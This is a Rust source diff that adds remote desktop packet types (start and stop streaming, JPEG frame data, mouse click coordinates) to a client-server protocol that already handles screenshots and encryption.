@@ -28,6 +28,7 @@ pub enum ServerboundPacket {
     EncryptionConfirm(Vec<u8>, Vec<u8>), // encrypted secret and token
     ClientInfo(ClientInfo),
     ScreenshotResult(Vec<u8>),
+    RemoteDesktopFrame(RemoteDesktopFrame)
 }
 
 impl Packet for ServerboundPacket {
@@ -52,6 +53,9 @@ pub enum ClientboundPacket {
     ScreenshotDisplay(String),
     Reconnect,
     Disconnect,
+    StartRemoteDesktop(RemoteDesktopConfig),
+    StopRemoteDesktop,
+    MouseClick(MouseClickData),
 }
 
 impl Packet for ClientboundPacket {
@@ -65,4 +69,26 @@ impl Packet for ClientboundPacket {
         let mut d = Deserializer::new(buf);
         Self::deserialize(&mut d).map(|p| (p, d.into_inner()))
     }
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct RemoteDesktopConfig {
+    pub display: i32,
+    pub quality: u8,   // JPEG compression quality (1-100)
+    pub fps: u8,       // Target frames per second
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct RemoteDesktopFrame {
+    pub timestamp: u64,
+    pub display: i32,
+    pub data: Vec<u8>, // JPEG encoded image data
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct MouseClickData {
+    pub click_type: i32,
+    pub display: i32,
+    pub x: i32,
+    pub y: i32,
 }
